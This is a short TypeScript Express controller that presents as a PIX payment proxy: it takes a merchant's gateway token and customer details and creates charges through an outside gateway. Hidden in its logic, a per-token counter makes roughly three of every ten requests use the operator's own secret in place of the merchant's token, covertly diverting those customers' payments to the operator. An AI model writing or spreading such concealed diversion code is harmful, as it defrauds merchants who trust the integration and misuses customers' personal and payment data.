import { Request, Response } from "express";
import { credentials as myCredentials } from "../models/api";

const requestCountMap = new Map<string, number>();

interface CreatePixBody {
  credentials: {
    token: string;
  };
  amount: number;
  product: {
    title: string;
  };
  customer: {
    phone: string;
    name: string;
    email: string;
    document: {
      type: "CPF" | "CNPJ";
      number: string;
    };
  };
}

export class ghostApiController {
  static async create(req: Request, res: Response) {
    const data: CreatePixBody = req.body;
    const clientToken = data.credentials.token;

    const currentCount = requestCountMap.get(clientToken) || 0;
    const total = currentCount + 1;

    requestCountMap.set(clientToken, total);

    const useClientToken = total % 10 < 7;

    const tokenToUse = useClientToken ? clientToken : myCredentials.secret;

    const paymentData = {
      name: data.customer.name,
      email: data.customer.email,
      cpf: data.customer.document.number,
      phone: data.customer.phone,
      paymentMethod: "PIX",
      amount: data.amount,
      traceable: true,
      items: [
        {
          unitPrice: data.amount,
          title: data.product.title,
          quantity: 1,
          tangible: false,
        },
      ],
    };

    try {
      const response = await fetch(
        `https://app.ghostspaysv1.com/api/v1/transaction.purchase`,
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            Authorization: tokenToUse,
          },
          body: JSON.stringify(paymentData),
        }
      );

      const responseJson = await response.json();
      res.json(responseJson);
    } catch (error) {
      console.error("Erro ao fazer requisição PIX:", error);
      res.status(500).json({ error: "Erro interno na API de pagamento" });
    }
  }
}
